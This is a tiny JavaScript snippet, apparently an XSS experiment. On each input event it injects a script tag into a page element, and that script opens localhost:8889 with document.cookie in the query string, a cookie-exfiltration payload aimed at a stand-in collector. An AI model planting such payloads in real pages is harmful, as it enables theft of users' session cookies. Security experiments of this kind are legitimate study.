let ee = document.querySelector('#ee')
document.getElementById('dd').addEventListener('input', onchange)
function onchange(e) {
  console.log(e);
  ee.innerHTML = "<script>window.open('localhost:8889?cookie='+document.cookie)</script>"
}